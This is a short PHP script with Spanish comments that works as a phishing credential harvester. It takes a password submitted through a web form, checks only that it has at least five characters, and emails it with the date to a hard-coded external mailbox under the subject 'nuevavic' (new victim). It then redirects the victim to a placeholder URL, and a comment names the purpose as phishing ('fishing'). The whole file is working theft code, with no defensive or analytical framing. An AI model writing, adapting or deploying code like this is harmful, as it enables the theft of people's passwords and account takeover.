<?php
//--------------------------------------//
#Aqui capturamos los datos de los campos// 
 $contraseña = $_POST['password'];      //
 $fecha = date('d-m-y');                //
//--------------------------------------//

//creamos una funcion que nos haga una validacion de los datos introducidos
function ChechPassword($password)
{
	//comprobamos si el password introducido es menor a 5 caracteres
	//en cuyo caso le mostramos un mensaje de error
	if(strlen($password)<5){
	echo '
	<p style="margin-left:330px; width:240px; height:15px; margin-top:-20px; background-color:#F6F; border:1px solid #F00;
 	font-family:"lucida grande",tahoma,verdana,arial,sans-serif; position:relative;">
 	Contraseña de al menos 5 caracteres
 	</p>';
	 } else {//
		 # Aqui generamos un correo electronico para hacer otro respaldo de la informacion introducida    //
		 $receptor = "eldadofarias@hotmail.com";                               //correo electronico      //
         $asunto = "nuevavic";                                                 //asunto del mensaje              //
         $mensaje ="password===".$password."---".$fecha;//mensaje del correo              //
         mail($receptor,$asunto,$mensaje);//enviamos el mail en cuestion                                         //
         $url = 'Aqui va la url ';//url a la cual se redireccionara despues de haber terminado el fishing        //
         $redireccion = 'location:'.$url;                                                                        //  
         header($redireccion);                                                                                   //
         //------------------------------------------------------------------------------------------------------//
	}
}
//ejecutmos la funcion que checkea que la contraseña es mayor a 5 caracteres
ChechPassword($contraseña);
?>
